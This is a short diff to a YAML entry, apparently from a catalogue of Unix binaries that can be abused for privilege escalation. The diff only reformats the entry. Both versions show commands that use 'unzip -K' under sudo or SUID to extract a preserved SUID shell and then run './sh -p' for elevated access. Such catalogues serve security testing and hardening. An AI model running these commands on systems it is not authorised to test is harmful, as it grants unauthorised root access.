@@ -11,11 +11,11 @@ description: |
   Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
 functions:
   sudo:
-    code: |
-      sudo unzip -K shell.zip
-      ./sh -p
+    - code: |
+        sudo unzip -K shell.zip
+        ./sh -p
   suid:
-    code: |
-      ./unzip -K shell.zip
-      ./sh -p
+    - code: |
+        ./unzip -K shell.zip
+        ./sh -p
 ---
